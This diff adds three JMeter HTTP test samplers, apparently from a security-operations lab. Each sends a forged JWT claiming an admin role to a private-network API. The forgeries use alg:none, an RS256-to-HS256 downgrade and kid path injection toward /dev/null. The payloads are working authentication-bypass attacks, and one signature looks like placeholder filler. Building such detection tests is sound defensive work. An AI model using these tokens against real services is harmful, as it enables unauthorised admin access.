@@ -1,0 +1,143 @@
+<!-- JWT 변조 공격 1: 알고리즘 none으로 변경 -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_jwt_none_algorithm" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="keyword" elementType="HTTPArgument">
+        <stringProp name="Argument.value">test</stringProp>
+        <stringProp name="Argument.name">keyword</stringProp>
+      </elementProp>
+      <elementProp name="sort" elementType="HTTPArgument">
+        <stringProp name="Argument.value">latest</stringProp>
+        <stringProp name="Argument.name">sort</stringProp>
+      </elementProp>
+      <elementProp name="page" elementType="HTTPArgument">
+        <stringProp name="Argument.value">0</stringProp>
+        <stringProp name="Argument.name">page</stringProp>
+      </elementProp>
+      <elementProp name="size" elementType="HTTPArgument">
+        <stringProp name="Argument.value">6</stringProp>
+        <stringProp name="Argument.name">size</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
+<hashTree>
+  <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="JWT None Algorithm Header" enabled="true">
+    <collectionProp name="HeaderManager.headers">
+      <!-- alg: none, role: admin으로 변조된 JWT -->
+      <elementProp name="Authorization" elementType="Header">
+        <stringProp name="Header.name">Authorization</stringProp>
+        <stringProp name="Header.value">Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQGNhbXB1cy5sb2NhbCJ9.</stringProp>
+      </elementProp>
+      <elementProp name="X-SOC-Test" elementType="Header">
+        <stringProp name="Header.name">X-SOC-Test</stringProp>
+        <stringProp name="Header.value">true</stringProp>
+      </elementProp>
+    </collectionProp>
+  </HeaderManager>
+  <hashTree/>
+</hashTree>
+
+<!-- JWT 변조 공격 2: HS256으로 다운그레이드 (공개키를 대칭키로 사용) -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_jwt_hs256_downgrade" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="keyword" elementType="HTTPArgument">
+        <stringProp name="Argument.value">test</stringProp>
+        <stringProp name="Argument.name">keyword</stringProp>
+      </elementProp>
+      <elementProp name="sort" elementType="HTTPArgument">
+        <stringProp name="Argument.value">latest</stringProp>
+        <stringProp name="Argument.name">sort</stringProp>
+      </elementProp>
+      <elementProp name="page" elementType="HTTPArgument">
+        <stringProp name="Argument.value">0</stringProp>
+        <stringProp name="Argument.name">page</stringProp>
+      </elementProp>
+      <elementProp name="size" elementType="HTTPArgument">
+        <stringProp name="Argument.value">6</stringProp>
+        <stringProp name="Argument.name">size</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
+<hashTree>
+  <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="JWT HS256 Downgrade Header" enabled="true">
+    <collectionProp name="HeaderManager.headers">
+      <!-- RS256에서 HS256으로 다운그레이드, 공개키로 서명 위조 -->
+      <elementProp name="Authorization" elementType="Header">
+        <stringProp name="Header.name">Authorization</stringProp>
+        <stringProp name="Header.value">Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQGNhbXB1cy5sb2NhbCJ9.QsVJpJLO-_8kR_v9kqQt-PIQBqZYPJmUa5mHzYdQf0U</stringProp>
+      </elementProp>
+      <elementProp name="X-SOC-Test" elementType="Header">
+        <stringProp name="Header.name">X-SOC-Test</stringProp>
+        <stringProp name="Header.value">true</stringProp>
+      </elementProp>
+    </collectionProp>
+  </HeaderManager>
+  <hashTree/>
+</hashTree>
+
+<!-- JWT 변조 공격 3: KID 인젝션 (경로 조작) -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_jwt_kid_injection" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="keyword" elementType="HTTPArgument">
+        <stringProp name="Argument.value">test</stringProp>
+        <stringProp name="Argument.name">keyword</stringProp>
+      </elementProp>
+      <elementProp name="sort" elementType="HTTPArgument">
+        <stringProp name="Argument.value">latest</stringProp>
+        <stringProp name="Argument.name">sort</stringProp>
+      </elementProp>
+      <elementProp name="page" elementType="HTTPArgument">
+        <stringProp name="Argument.value">0</stringProp>
+        <stringProp name="Argument.name">page</stringProp>
+      </elementProp>
+      <elementProp name="size" elementType="HTTPArgument">
+        <stringProp name="Argument.value">6</stringProp>
+        <stringProp name="Argument.name">size</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
+<hashTree>
+  <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="JWT KID Injection Header" enabled="true">
+    <collectionProp name="HeaderManager.headers">
+      <!-- KID를 /dev/null로 조작하여 빈 키 사용 유도 -->
+      <elementProp name="Authorization" elementType="Header">
+        <stringProp name="Header.name">Authorization</stringProp>
+        <stringProp name="Header.value">Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.eyJyb2xlIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQGNhbXB1cy5sb2NhbCJ9.n9Jj9U9h9Q8J9J9J9J9J9J9J9J9J9J9J9J9J9J9J9J9J9J9J9A</stringProp>
+      </elementProp>
+      <elementProp name="X-SOC-Test" elementType="Header">
+        <stringProp name="Header.name">X-SOC-Test</stringProp>
+        <stringProp name="Header.value">true</stringProp>
+      </elementProp>
+    </collectionProp>
+  </HeaderManager>
+  <hashTree/>
+</hashTree>
